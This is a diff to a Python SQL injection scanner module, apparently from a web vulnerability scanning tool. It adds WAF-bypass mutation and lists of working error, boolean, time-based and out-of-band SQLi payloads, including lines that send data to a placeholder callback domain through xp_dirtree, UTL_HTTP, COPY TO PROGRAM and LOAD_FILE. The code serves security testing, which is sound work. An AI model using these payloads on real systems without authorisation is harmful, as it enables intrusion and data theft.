@@ -25,29 +25,68 @@ False Positive Rate: <0.01%
 from __future__ import annotations
 
 import asyncio
-import base64
 import hashlib
-import json
 import math
 import random
 import re
 import statistics
-import string
 import time
-from collections import Counter, defaultdict
 from dataclasses import dataclass, field
 from enum import Enum, auto
-from typing import TYPE_CHECKING, Any, Callable
-from urllib.parse import parse_qs, urlencode, urlparse, quote, unquote
+from typing import TYPE_CHECKING, Any
+from urllib.parse import parse_qs, urlencode, urlparse, quote
 
 import httpx
 
-from scanning.vuln_scanner import Finding, ScanModule
+from scanning.findings import Finding, VulnType as FindingVulnType, VulnCategory, Severity
+from scanning.vuln_scanner import ScanModule
+from scanning.scan_context import ScanContext
+from utils.shared_findings_store import SharedFindingsStore, VulnType as StoreVulnType
 from utils.logger import get_logger
+from utils.network_utils import resolve_base_url
 from utils.rate_limiter import RateLimiter
 from utils.exploitation_helper import ExploitationHelper
 from utils.scanner_helpers import WAFType as BaseWAFType, WAFDetector as BaseWAFDetector
 from utils.exploit_policy_engine import get_exploit_policy, ExploitMode
+from utils.scan_client import get_scan_client
+from utils.payload_library import PayloadLibrary, PayloadCategory
+
+# Form Context Preserver for maintaining valid values during injection testing (2026-02-20)
+# Solves: Testing SQLi in username field but password empty → server rejects
+from scanning.form_context_preserver import FormContextPreserver, FormDefinition
+
+# OOB Engine for blind SQLi detection (2026-02-12)
+_OOB_AVAILABLE = True
+try:
+    from utils.oob_engine import OOBEngine, OOBProtocol, OOBPayloadGenerator
+except ImportError:
+    _OOB_AVAILABLE = False
+
+# WAF Bypass Engine integration (2026-02-20)
+# Uses sophisticated behavioural bypass strategies from phantom/waf_bypass_engine.py
+_WAF_BYPASS_ENGINE_AVAILABLE = True
+try:
+    from phantom.waf_bypass_engine import (
+        WAFBypassEngine, WAFDetectionResult, BehaviourFamily,
+        BypassTechnique, get_waf_bypass_engine_sync,
+    )
+except ImportError:
+    _WAF_BYPASS_ENGINE_AVAILABLE = False
+    WAFBypassEngine = None
+    WAFDetectionResult = None
+
+# Second-Order Tracker for cross-endpoint vulnerability detection (2026-02-20)
+# Tracks inputs to detect payloads that execute in different locations
+_SECOND_ORDER_AVAILABLE = True
+try:
+    from scanning.second_order_tracker import (
+        SecondOrderTracker,
+        VulnType as SecondOrderVulnType,
+    )
+except ImportError:
+    _SECOND_ORDER_AVAILABLE = False
+    SecondOrderTracker = None  # type: ignore
+    SecondOrderVulnType = None  # type: ignore
 
 if TYPE_CHECKING:
     from core.config_manager import Settings
@@ -69,6 +108,28 @@ except ImportError:
 # =============================================================================
 
 SQLI_SCANNER_VERSION = "3.0.0-GOD-MODE"
+
+# =============================================================================
+# PERF-FIX 2026-02-20: Intelligent Payload Selection Constants
+# Problem: Testing ALL payloads (100+ × 5 mutations = 500+ requests per endpoint)
+# Solution: Early-exit + intelligent selection reduces to 30-50 targeted requests
+# =============================================================================
+
+# Maximum findings per endpoint before early-exit
+# Multiple SQLi types CAN exist (error + time), but 3 findings proves the point
+MAX_FINDINGS_PER_ENDPOINT = 3
+
+# Maximum findings per parameter before moving to next
+MAX_FINDINGS_PER_PARAM = 2
+
+# Maximum total SQLi findings per scan (prevents report bloat)
+MAX_TOTAL_FINDINGS = 50
+
+# Maximum payloads to test when using intelligent selection
+MAX_INTELLIGENT_PAYLOADS = 30
+
+# Fallback: maximum hardcoded payloads when intelligent selection unavailable
+MAX_FALLBACK_PAYLOADS = 15
 
 
 # =============================================================================
@@ -146,6 +207,58 @@ class DatabaseType(Enum):
     SQLITE = "sqlite"
     MARIADB = "mariadb"
     UNKNOWN = "unknown"
+
+
+# =============================================================================
+# SPA Detection Helper (FP FIX 2026-02-12)
+# =============================================================================
+
+# SPA indicators - comprehensive list for catch-all route detection
+_SPA_INDICATORS = [
+    # Angular
+    "ng-app", "data-ng-", "ng-controller", "[routerLink]", "ng-version",
+    # React
+    "data-reactroot", "data-react-helmet", "react-root", "__INITIAL_STATE__",
+    # Vue
+    "__vue__", "data-v-", "v-app",
+    # Next.js / Nuxt
+    "__next", "__NUXT__", "_nuxt",
+    # Svelte / SvelteKit
+    "data-svelte", "svelte-", "class=\"svelte-", "__svelte",
+    # Qwik
+    "data-qwik", "q:container", "qwik/optimizer", "__qwik",
+    # SolidJS
+    "data-solid", "_$HY", "__solid",
+    # Astro
+    "astro-island", "data-astro-cid-",
+    # Remix
+    "__remix_ssr__", "__remixContext", "__REMIX_CONTEXT__", "__remix",
+    # Ember
+    "ember-view",
+    # Common SPA root IDs
+    'id="root"', 'id="app"', 'id="__next"', 'id="__nuxt"',
+]
+
+
+def _is_spa_response(content_type: str, body: str, body_length: int) -> bool:
+    """Check if response looks like SPA catch-all (HTML with bundled JS).
+
+    FP PREVENTION: SPAs return the same HTML shell for ANY path.
+    Testing SQLi on these endpoints produces false positives because
+    responses are identical regardless of input.
+    """
+    if "text/html" not in content_type.lower():
+        return False
+
+    # Check for SPA framework indicators
+    if any(ind in body for ind in _SPA_INDICATORS):
+        return True
+
+    # Large HTML response (>50KB) with bundled JS is likely SPA
+    if body_length > 50000 and ("<script" in body or "bundle.js" in body.lower()):
+        return True
+
+    return False
 
 
 @dataclass
@@ -271,12 +384,35 @@ class ResponseCluster:
         if not self.centroid:
             return False
         return self.centroid.similarity_score(fp) < threshold
-    
+
     def avg_similarity(self, fp: ResponseFingerprint) -> float:
         """Average similarity to all fingerprints in cluster."""
         if not self.fingerprints:
             return 0
         return statistics.mean(f.similarity_score(fp) for f in self.fingerprints)
+
+    def calculate_variance(self) -> dict:
+        """Calculate baseline variance for adaptive thresholds."""
+        if len(self.fingerprints) < 2 or not self.centroid:
+            return {"similarity_std": 5.0, "length_std": 50, "stable": True}
+
+        # Similarity variance
+        similarities = [self.centroid.similarity_score(fp) for fp in self.fingerprints]
+        sim_std = statistics.stdev(similarities) if len(similarities) > 1 else 0
+
+        # Content length variance
+        lengths = [fp.content_length for fp in self.fingerprints]
+        length_std = statistics.stdev(lengths) if len(lengths) > 1 else 0
+
+        # Determine if application is stable (low variance)
+        stable = sim_std < 10 and length_std < 100
+
+        return {
+            "similarity_std": sim_std,
+            "length_std": length_std,
+            "stable": stable,
+            "min_similarity": min(similarities) if similarities else 0,
+        }
 
 
 @dataclass
@@ -415,24 +551,97 @@ class WAFDetector:
 # =============================================================================
 
 class PayloadMutator:
-    """Intelligent payload mutation for WAF bypass and coverage."""
-    
+    """Intelligent payload mutation for WAF bypass and coverage.
+
+    2026-02-20: Enhanced with WAFBypassEngine integration.
+    When a WAFDetectionResult is provided, uses sophisticated behavioural bypass
+    strategies from phantom/waf_bypass_engine.py for better evasion.
+    """
+
     @classmethod
-    def mutate(cls, payload: str, waf_type: WAFType = WAFType.NONE) -> list[str]:
-        """Generate mutations of a payload."""
+    def mutate(
+        cls,
+        payload: str,
+        waf_type: WAFType = WAFType.NONE,
+        waf_detection: "WAFDetectionResult | None" = None,
+    ) -> list[str]:
+        """Generate mutations of a payload.
+
+        Args:
+            payload: Original SQL injection payload
+            waf_type: Detected WAF type (legacy API)
+            waf_detection: Full WAFDetectionResult from WAFBypassEngine (preferred)
+
+        Returns:
+            List of mutated payloads for WAF bypass
+        """
         mutations = [payload]  # Original
-        
-        # Basic mutations
+
+        # 2026-02-20: Use WAFBypassEngine if available and waf_detection provided
+        if _WAF_BYPASS_ENGINE_AVAILABLE and waf_detection is not None and waf_detection.detected:
+            try:
+                bypass_mutations = cls._apply_waf_bypass_engine(payload, waf_detection)
+                if bypass_mutations:
+                    mutations.extend(bypass_mutations)
+                    logger.debug(
+                        f"[SQLi] WAFBypassEngine generated {len(bypass_mutations)} bypass variants "
+                        f"for {waf_detection.waf_name} ({waf_detection.behaviour_family.value})"
+                    )
+                    # Return early with sophisticated bypasses - no need for basic mutations
+                    return list(set(mutations))[:25]
+            except Exception as e:
+                logger.debug(f"[SQLi] WAFBypassEngine mutation failed, falling back: {e}")
+
+        # Basic mutations (fallback or when no WAF detected)
         mutations.extend(cls._case_mutations(payload))
         mutations.extend(cls._whitespace_mutations(payload))
         mutations.extend(cls._comment_mutations(payload))
         mutations.extend(cls._encoding_mutations(payload))
-        
-        # WAF-specific mutations
+
+        # WAF-specific mutations (legacy approach)
         if waf_type != WAFType.NONE:
             mutations.extend(cls._waf_specific_mutations(payload, waf_type))
-        
+
         return list(set(mutations))[:20]  # Limit to 20 unique mutations
+
+    @classmethod
+    def _apply_waf_bypass_engine(
+        cls,
+        payload: str,
+        waf_detection: "WAFDetectionResult",
+    ) -> list[str]:
+        """Apply WAFBypassEngine bypass strategies to payload.
+
+        Uses behavioural classification for intelligent bypass selection:
+        - REGEX_NAIVE: Simple encoding bypasses
+        - REGEX_ADVANCED: Obfuscation + fragmentation
+        - MACHINE_LEARNING: Semantic-valid payloads
+        - SIGNATURE_BASED: Mutation techniques
+        - HYBRID: Combined approach
+        """
+        if not _WAF_BYPASS_ENGINE_AVAILABLE:
+            return []
+
+        try:
+            engine = get_waf_bypass_engine_sync()
+
+            # Generate bypass variants using the engine
+            # Context "sql" enables SQL-specific transformations
+            variants = engine.generate_bypass_variants(
+                payload=payload,
+                detection=waf_detection,
+                context="sql",
+                max_variants=10,
+            )
+
+            # Extract just the payloads (not the technique info)
+            bypassed_payloads = [v[0] for v in variants if v[0] != payload]
+
+            return bypassed_payloads
+
+        except Exception as e:
+            logger.debug(f"[SQLi] WAFBypassEngine error: {e}")
+            return []
     
     @classmethod
     def _case_mutations(cls, payload: str) -> list[str]:
@@ -577,12 +786,58 @@ class DatabaseFingerprinter:
             (r"Error:.*mysql_", 85),
             (r"SQL syntax.*error", 80),
             (r"check the manual that corresponds to your MySQL server version", 95),
+
+            # FIX 2026-02-16: Classic PHP mysql_* function errors (legacy apps)
+            # These are critical for DVWA, bWAPP, Mutillidae, and old PHP apps
+            (r"mysql_query\(\)", 90),
+            (r"mysql_connect\(\)", 90),
+            (r"mysql_select_db\(\)", 85),
+            (r"mysql_db_query\(\)", 85),
+            (r"mysql_real_escape_string\(\)", 80),
+            (r"mysqli_query\(\)", 90),
+            (r"mysqli_connect\(\)", 90),
+            (r"mysqli_error\(\)", 85),
+            (r"mysqli_real_escape_string\(\)", 80),
+            (r"mysql_error\(\)", 90),
+            (r"Call to undefined function mysql_", 85),
+            (r"Access denied for user.*@", 80),  # MySQL auth error reveals DB
+            (r"Can't connect to MySQL server", 80),
+            (r"Too many connections", 70),
+            (r"Lost connection to MySQL server", 75),
+            (r"Table '.*' doesn't exist", 85),
+            (r"Duplicate entry.*for key", 80),
+            (r"Data truncated for column", 75),
+            (r"Incorrect.*value.*for column", 80),
+            (r"Field.*doesn't have a default value", 75),
+            # PHP PDO MySQL errors
+            (r"PDOStatement::execute\(\)", 85),
+            (r"PDO::query\(\)", 85),
+            (r"PDOException", 90),
+            (r"SQLSTATE\[42000\]", 85),  # Syntax error
+            (r"SQLSTATE\[42S02\]", 85),  # Table not found
+            (r"SQLSTATE\[42S22\]", 85),  # Column not found
+            (r"SQLSTATE\[23000\]", 80),  # Integrity constraint
+            # WordPress/Drupal/Joomla specific MySQL errors
+            (r"WordPress database error", 90),
+            (r"wpdb->query", 85),
+            (r"Drupal.*Database.*error", 90),
+            (r"Joomla.*Database.*error", 90),
         ],
         DatabaseType.MARIADB: [
+            # Theme 11: Extended MariaDB 10.5+ patterns
             (r"MariaDB.*server version", 100),
             (r"You have an error.*MariaDB", 100),
+            (r"MariaDB Connection Error", 95),
+            (r"MariaDB.*Error \d+", 90),
+            (r"ER_PARSE_ERROR.*MariaDB", 90),
+            (r"mariadb-connector", 85),
+            (r"libmysqlclient.*MariaDB", 85),
+            (r"HY000.*MariaDB", 80),
+            (r"COLLATION.*utf8mb4_uca1400", 75),  # MariaDB 10.10+ specific collation
+            (r"Aria storage engine", 70),  # MariaDB-specific storage engine
         ],
         DatabaseType.POSTGRESQL: [
+            # Theme 11: Extended PostgreSQL 15+ patterns
             (r"PostgreSQL.*ERROR", 100),
             (r"ERROR:\s+syntax error at or near", 100),
             (r"pg_query\(\)", 95),
@@ -593,6 +848,21 @@ class DatabaseFingerprinter:
             (r"invalid input syntax for type", 80),
             (r"pg_exec\(\)", 85),
             (r"Warning:.*pg_", 85),
+            # PostgreSQL 14+ / 15+
+            (r"SQLSTATE\s+\d{5}", 85),  # PostgreSQL error codes
+            (r"DETAIL:\s+", 80),  # Error detail prefix
+            (r"HINT:\s+", 75),  # Error hint prefix
+            (r"permission denied for relation", 80),
+            (r"violates.*constraint", 75),
+            # CockroachDB (PostgreSQL-compatible)
+            (r"CockroachDB.*error", 95),
+            (r"cockroachdb.*syntax", 90),
+            (r"crdb_internal", 85),  # CockroachDB internal schema
+            # Neon (serverless Postgres)
+            (r"neon\.tech.*error", 85),
+            # Supabase PostgreSQL
+            (r"supabase.*pg_error", 85),
+            (r"PostgREST.*error", 80),
         ],
         DatabaseType.MSSQL: [
             (r"Microsoft SQL Server.*Driver", 100),
@@ -615,12 +885,26 @@ class DatabaseFingerprinter:
             (r"PLS-[0-9]{5}:", 90),
         ],
         DatabaseType.SQLITE: [
+            # Theme 11: Extended SQLite 3.37+ patterns
             (r"sqlite3\.OperationalError", 100),
             (r"SQLITE_ERROR", 95),
             (r"SQLite error", 95),
             (r"System\.Data\.SQLite", 95),
             (r'near ".*": syntax error', 90),
             (r"unrecognized token", 85),
+            # SQLite 3.37+ (strict tables, RETURNING clause errors)
+            (r"SQLITE_CONSTRAINT", 90),
+            (r"SQLITE_MISMATCH", 85),
+            (r"SQLITE_RANGE", 80),
+            (r"cannot store .* in .* column", 85),  # Strict tables (3.37+)
+            (r"RETURNING.*not supported", 80),  # Old SQLite with RETURNING
+            (r"JSON1 extension", 75),  # SQLite JSON extension
+            (r"FTS\d+ syntax error", 80),  # Full-text search errors
+            # SQLite WASM / browser-based
+            (r"sql\.js.*error", 85),  # sql.js (WASM SQLite)
+            (r"better-sqlite3", 80),  # Node.js better-sqlite3
+            (r"sqlite-wasm", 80),  # SQLite WASM builds
+            (r"@libsql", 80),  # Turso/libSQL (SQLite fork)
         ],
     }
     
@@ -829,6 +1113,8 @@ class SQLiScanner(ScanModule):
     # ===========================================
     # FALSE POSITIVE INDICATORS
     # ===========================================
+    # FIX 2026-02-16: Removed "Invalid input" - it blocks DVWA, bWAPP, Mutillidae
+    # These PHP apps show "Invalid input" alongside SQL error messages
     FP_INDICATORS = [
         r"404 Not Found",
         r"403 Forbidden",
@@ -836,7 +1122,7 @@ class SQLiScanner(ScanModule):
         r"Page not found",
         r"Access denied",
         r"Please enter a valid",
-        r"Invalid input",
+        # r"Invalid input",  # REMOVED - blocks legitimate SQL errors on PHP apps
         r"required field",
         r"validation error",
         r"captcha",
@@ -878,6 +1164,10 @@ class SQLiScanner(ScanModule):
         ("' AND extractvalue(1,1)--", "mysql_extractvalue", 80),
         ("' || (SELECT '')||'", "pg_concat", 75),
         ("' AND 1=ctxsys.drithsx.sn(1,'a')--", "oracle_ctx", 80),
+        # FIX 2026-02-12: LIKE/search context payloads
+        ("'))--", "like_break", 65),  # Break out of LIKE '%...%'
+        ("')) OR 1=1--", "like_or", 70),
+        ("%'))--", "like_wildcard_break", 65),
     ]
     
     # Boolean-based payloads (true/false pairs)
@@ -892,22 +1182,90 @@ class SQLiScanner(ScanModule):
         ("1) AND (1=1", "1) AND (1=2", "paren_numeric"),
         ("' AND SUBSTRING('a',1,1)='a'--", "' AND SUBSTRING('a',1,1)='b'--", "substring"),
         ("'/**/AND/**/'1'='1", "'/**/AND/**/'1'='2", "comment_bypass"),
+        # FIX 2026-02-12: LIKE/search context payloads (breaks out of LIKE '%...%')
+        # Common in search functionality - true returns all results, false returns none
+        ("'))--", "')) AND 1=2--", "like_breakout"),  # Juice Shop style
+        ("')) OR 1=1--", "')) AND 1=2--", "like_or"),
+        ("%')) OR 1=1--", "%')) AND 1=2--", "like_wildcard"),
+        ("' OR 1=1)--", "' AND 1=2)--", "single_paren_or"),
+        ("')) UNION SELECT NULL--", "')) AND 1=2--", "like_union"),
     ]
     
     # Time-based payloads
+    # FIX 2026-02-19: Expanded payloads to reduce ~35% blind SQLi miss rate
+    # Added: conditional delays, numeric contexts, JSON contexts, comment variations
     TIME_PAYLOADS = [
+        # MySQL - Primary
         ("' AND SLEEP({delay})--", "mysql", "sleep"),
         ("' OR SLEEP({delay})--", "mysql", "sleep_or"),
         ("' AND (SELECT SLEEP({delay}))--", "mysql", "subquery_sleep"),
         ("' AND IF(1=1,SLEEP({delay}),0)--", "mysql", "if_sleep"),
+        ("' AND BENCHMARK(50000000,SHA1('test'))--", "mysql", "benchmark"),
+        # FIX 2026-02-19: MySQL additional contexts (miss rate reduction)
+        ("1' AND SLEEP({delay})--", "mysql", "numeric_sleep"),
+        ("1) AND SLEEP({delay})--", "mysql", "paren_sleep"),
+        ("' AND SLEEP({delay})#", "mysql", "sleep_hash"),
+        ("' AND (SELECT * FROM (SELECT SLEEP({delay}))a)--", "mysql", "nested_sleep"),
+        ("'-SLEEP({delay})-'", "mysql", "arithmetic_sleep"),
+        ("' AND SLEEP({delay}) AND '1'='1", "mysql", "balanced_sleep"),
+
+        # MSSQL - Primary
         ("'; WAITFOR DELAY '0:0:{delay}'--", "mssql", "waitfor"),
         ("' WAITFOR DELAY '0:0:{delay}'--", "mssql", "waitfor_no_stack"),
+        # FIX 2026-02-19: MSSQL additional contexts
+        ("1; WAITFOR DELAY '0:0:{delay}'--", "mssql", "numeric_waitfor"),
+        ("'); WAITFOR DELAY '0:0:{delay}'--", "mssql", "paren_waitfor"),
+        ("' IF 1=1 WAITFOR DELAY '0:0:{delay}'--", "mssql", "conditional_waitfor"),
+        ("' AND 1=(SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:{delay}')--", "mssql", "subquery_waitfor"),
+
+        # PostgreSQL - Primary
         ("'; SELECT pg_sleep({delay})--", "postgresql", "pg_sleep"),
         ("' AND pg_sleep({delay})--", "postgresql", "pg_sleep_and"),
         ("' || pg_sleep({delay})--", "postgresql", "pg_sleep_concat"),
+        # FIX 2026-02-19: PostgreSQL additional contexts
+        ("1; SELECT pg_sleep({delay})--", "postgresql", "numeric_pg_sleep"),
+        ("' AND (SELECT pg_sleep({delay}))--", "postgresql", "subquery_pg_sleep"),
+        ("' AND pg_sleep({delay}) IS NOT NULL--", "postgresql", "isnull_pg_sleep"),
+        ("$$ SELECT pg_sleep({delay}) $$", "postgresql", "dollar_pg_sleep"),
+
+        # Oracle - Primary
         ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--", "oracle", "dbms_pipe"),
         ("' AND 1=DBMS_LOCK.SLEEP({delay})--", "oracle", "dbms_lock"),
-        ("' AND BENCHMARK(50000000,SHA1('test'))--", "mysql", "benchmark"),
+        # FIX 2026-02-19: Oracle additional contexts
+        ("' AND 1=(SELECT COUNT(*) FROM ALL_USERS WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})=1)--", "oracle", "subquery_pipe"),
+        ("' || DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) || '", "oracle", "concat_pipe"),
+
+        # SQLite - computationally expensive (no native SLEEP)
+        ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", "sqlite", "randomblob"),
+        ("' OR 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", "sqlite", "randomblob_or"),
+        ("')) AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", "sqlite", "randomblob_paren"),
+        # FIX 2026-02-19: SQLite additional heavy operations
+        ("' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS t1, (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS t2, (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS t3, (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS t4)>0--", "sqlite", "cartesian_product"),
+
+        # FIX 2026-02-19: JSON context payloads (modern APIs often use JSON)
+        ('{"id":"1\' AND SLEEP({delay})--"}', "mysql", "json_sleep"),
+        ('{"id":"1\'; WAITFOR DELAY \'0:0:{delay}\'--"}', "mssql", "json_waitfor"),
+        ('{"id":"1\'; SELECT pg_sleep({delay})--"}', "postgresql", "json_pg_sleep"),
+    ]
+
+    # FIX 2026-02-19: Mandatory OOB fallback payloads for blind SQLi
+    # When time-based fails, OOB provides alternative detection path
+    OOB_MANDATORY_PAYLOADS = [
+        # These are tested when TIME_PAYLOADS show no result
+        # Oracle OOB (most reliable)
+        ("' || UTL_HTTP.REQUEST('http://{callback}/{token}') || '", "oracle", "utl_http"),
+        ("' || UTL_INADDR.GET_HOST_ADDRESS('{token}.{domain}') || '", "oracle", "utl_inaddr"),
+        ("' || (SELECT UTL_HTTP.REQUEST('http://{callback}/{token}') FROM DUAL) || '", "oracle", "utl_http_dual"),
+        # MSSQL OOB
+        ("'; EXEC master..xp_dirtree '//{token}.{domain}/a'--", "mssql", "xp_dirtree"),
+        ("'; EXEC master..xp_fileexist '//{token}.{domain}/a'--", "mssql", "xp_fileexist"),
+        ("'; DECLARE @q varchar(1024); SET @q='\\\\{token}.{domain}\\a'; EXEC master..xp_dirtree @q--", "mssql", "xp_dirtree_var"),
+        # PostgreSQL OOB
+        ("'; COPY (SELECT '') TO PROGRAM 'nslookup {token}.{domain}'--", "postgresql", "copy_nslookup"),
+        ("'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host={token}.{domain}')--", "postgresql", "dblink"),
+        # MySQL OOB (limited, requires FILE privilege)
+        ("' UNION SELECT LOAD_FILE(CONCAT('//{token}.{domain}/',VERSION()))--", "mysql", "load_file"),
+        ("' INTO OUTFILE '//{token}.{domain}/a'--", "mysql", "into_outfile"),
     ]
     
     # UNION payloads
@@ -952,18 +1310,116 @@ class SQLiScanner(ScanModule):
         '{"query":"mutation { login(user: \\"admin\'--\\", pass: \\"x\\") { token } }"}',
     ]
     
-    def __init__(self, settings: Settings) -> None:
-        super().__init__(settings)
-        self.timeout = settings.timeouts.request_timeout
+    def __init__(
+        self,
+        settings: "Settings",
+        *,  # Force keyword args for DI parameters
+        payload_library: Any = None,  # Phase 8: Optional injected PayloadLibrary
+        waf_bypass_engine: Any = None,  # Phase 8: Optional injected WAFBypassEngine
+        oob_engine: Any = None,  # Phase 8: Optional injected OOBEngine
+    ) -> None:
+        # Phase 8: Pass injected dependencies to base class
+        super().__init__(
+            settings,
+            payload_library=payload_library,
+            waf_bypass_engine=waf_bypass_engine,
+            oob_engine=oob_engine,
+        )
+        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
         self.time_delay = 5  # seconds
         self.max_union_columns = 20
         self.baseline_samples = 5
-        self.max_mutations = 15
+        # GAP-5 FIX 2026-02-18: Reduced from 15 to 5 for faster detection
+        # 15 mutations × 10 payloads = 150 requests per param - way too slow!
+        # 5 mutations is enough for WAF bypass without exhaustive testing
+        self.max_mutations = 5
         # Track findings progressively (survives timeout)
         self._progressive_findings: list[dict[str, Any]] = []
+
+        # Phase 8: Use injected payload library if available, else get singleton
+        self._payload_library = self.get_payload_library() or PayloadLibrary.get_instance()
+
+        # TIMEOUT-FIX 2026-02-12: Reduced limits to prevent module timeout (was causing 600s timeouts)
+        # Previous: 12 payloads × 8 mutations × 3 tests × 20s = 5760s per parameter (!)
+        # New: 4 payloads × 3 mutations × 3 tests × 20s = 720s worst case, typically much less
+        # GAP-5 FIX 2026-02-18: Reduced from 4 to 2 - time-based is very slow (5s+ each)
+        self.max_time_payloads = 2
+        self.max_time_mutations = 3       # Reduced from 8 - top WAF bypasses only
+        self.max_union_mutations = 5      # Reduced from 8 - UNION mutations
+        self.max_error_payloads = 10      # Reduced from 15 - error-based needs variety
+        self.max_header_error_payloads = 5  # Reduced from 8 - header injection testing
+        self.max_injectable_headers = 8   # Reduced from 12 - test more header vectors
+
+        # Per-endpoint timeout to prevent single endpoint from blocking
+        # PERF-FIX 2026-02-12: Reduced from 60s to 30s per endpoint
+        self.endpoint_timeout = 30.0
+
+        # Progress tracking for early exit when no findings
+        self._scan_start_time: float = 0.0
+        self._endpoints_without_findings: int = 0
+        # PERF-FIX 2026-02-12: More aggressive limits to avoid 600s timeout in full scans
+        self._max_no_progress_endpoints = 15  # Reduced from 30 to 15
+        self._max_endpoints = 50              # Max endpoints to test
+        self._max_total_time = 300.0          # Max 5 minutes total scan time
         # External tool integration
         self._orchestrator: Any = None
         self._use_sqlmap = getattr(settings, 'use_linux_tools', True)
+
+        # Second-order tracker for cross-endpoint vulnerability detection (2026-02-20)
+        self._second_order_tracker: "SecondOrderTracker | None" = None
+
+    def _init_second_order_tracker(self) -> None:
+        """Initialize the second-order tracker for this scan."""
+        if not _SECOND_ORDER_AVAILABLE:
+            return
+        try:
+            self._second_order_tracker = SecondOrderTracker.get_instance()
+            logger.debug("[SQLi] Second-order tracker initialized")
+        except Exception as e:
+            logger.debug(f"[SQLi] Could not initialize second-order tracker: {e}")
+            self._second_order_tracker = None
+
+    def _record_second_order_input(
+        self,
+        endpoint: str,
+        param_name: str,
+        payload: str,
+        response_status: int = 0,
+        response_contains_marker: bool = False,
+    ) -> None:
+        """
+        Record an input for second-order vulnerability detection.
+
+        Called when SQLi payloads are submitted, even if not immediately confirmed.
+        The tracker will later check if these payloads appear at other endpoints.
+        """
+        if not self._second_order_tracker:
+            return
+
+        try:
+            # Generate a unique marker for this payload
+            marker = self._second_order_tracker.generate_marker(SecondOrderVulnType.SQLI)
+
+            self._second_order_tracker.record_input(
+                endpoint=endpoint,
+                field_name=param_name,
+                payload=payload,
+                marker=marker,
+                vuln_type=SecondOrderVulnType.SQLI,
+                method="GET",  # Most SQLi testing is GET-based
+                response_status=response_status,
+                response_contains_marker=response_contains_marker,
+                auth_headers=getattr(self, "_auth_headers", {}),
+                metadata={
+                    "module": "sqli_scanner",
+                    "detection_method": "second_order",
+                },
+            )
+            logger.debug(
+                f"[SQLi] Recorded second-order input: {param_name}={payload[:30]}... -> {marker}"
+            )
+        except Exception as e:
+            logger.debug(f"[SQLi] Error recording second-order input: {e}")
 
     def _get_orchestrator(self) -> Any:
         """Get or create the Linux tools orchestrator."""
@@ -978,6 +1434,145 @@ class SQLiScanner(ScanModule):
                 return None
 
         return self._orchestrator
+
+    def _get_waf_detection(self) -> "WAFDetectionResult | None":
+        """Get WAF detection result from asset_data if available.
+
+        2026-02-20: Used for WAFBypassEngine integration.
+        Returns the WAFDetectionResult from full_scanner's Phase 0.95 detection.
+        """
+        if not _WAF_BYPASS_ENGINE_AVAILABLE:
+            return None
+
+        if not hasattr(self, '_asset_data') or not isinstance(self._asset_data, dict):
+            return None
+
+        waf_detection = self._asset_data.get("waf_detection")
+        if waf_detection is not None and hasattr(waf_detection, 'detected'):
+            return waf_detection
+
+        return None
+
+    def _get_payload_mutations(
+        self,
+        payload: str,
+        waf_type: WAFType = WAFType.NONE,
+    ) -> list[str]:
+        """Generate payload mutations using WAFBypassEngine when available.
+
+        2026-02-20: Wrapper method that integrates WAFBypassEngine with PayloadMutator.
+        Provides intelligent WAF bypass based on behavioural classification.
+        """
+        waf_detection = self._get_waf_detection()
+        return PayloadMutator.mutate(payload, waf_type, waf_detection)
+
+    def _get_library_error_payloads(self, db_type: str | None = None, max_payloads: int = 15) -> list[tuple[str, str, int]]:
+        """
+        Get error-based SQLi payloads from centralized PayloadLibrary.
+
+        Returns payloads in the same tuple format as ERROR_PAYLOADS:
+        (payload_string, payload_name, base_confidence)
+        """
+        try:
+            payload_objects = self._payload_library.get_payload_objects(
+                PayloadCategory.SQLI,
+                db_type=db_type,
+            )
+            # Filter for error-based payloads (tags: error-based, basic, boolean)
+            error_payloads = []
+            for p in payload_objects:
+                if "error-based" in p.tags or "boolean" in p.tags or "basic" in p.tags:
+                    # Map severity to confidence
+                    conf_map = {"critical": 80, "high": 70, "medium": 60, "low": 50}
+                    confidence = conf_map.get(p.severity, 60)
+                    error_payloads.append((p.raw, p.description.replace(" ", "_").lower(), confidence))
+                    if len(error_payloads) >= max_payloads:
+                        break
+            return error_payloads if error_payloads else self.ERROR_PAYLOADS[:max_payloads]
+        except Exception as e:
+            logger.debug(f"[SQLi] PayloadLibrary error, using fallback: {e}")
+            return self.ERROR_PAYLOADS[:max_payloads]
+
+    def _get_library_boolean_payloads(self, db_type: str | None = None, max_payloads: int = 15) -> list[tuple[str, str, str]]:
+        """
+        Get boolean-based SQLi payloads from centralized PayloadLibrary.
+
+        Returns payloads in the same tuple format as BOOLEAN_PAYLOADS:
+        (true_payload, false_payload, payload_name)
+        """
+        try:
+            payload_objects = self._payload_library.get_payload_objects(
+                PayloadCategory.SQLI,
+                db_type=db_type,
+            )
+            # Filter for boolean payloads
+            boolean_payloads = []
+            for p in payload_objects:
+                if "boolean" in p.tags:
+                    # Create true/false pair from payload
+                    true_payload = p.raw
+                    # Generate false variant by replacing 1=1 with 1=2
+                    false_payload = true_payload.replace("'1'='1", "'1'='2").replace("1=1", "1=2")
+                    if false_payload != true_payload:  # Only if we successfully created a false variant
+                        boolean_payloads.append((true_payload, false_payload, p.description.replace(" ", "_").lower()))
+                        if len(boolean_payloads) >= max_payloads:
+                            break
+            return boolean_payloads if boolean_payloads else self.BOOLEAN_PAYLOADS[:max_payloads]
+        except Exception as e:
+            logger.debug(f"[SQLi] PayloadLibrary error, using fallback: {e}")
+            return self.BOOLEAN_PAYLOADS[:max_payloads]
+
+    def _get_library_time_payloads(self, db_type: str | None = None, max_payloads: int = 10) -> list[tuple[str, str, str]]:
+        """
+        Get time-based SQLi payloads from centralized PayloadLibrary.
+
+        Returns payloads in the same tuple format as TIME_PAYLOADS:
+        (payload_template, db_type, payload_name)
+        """
+        try:
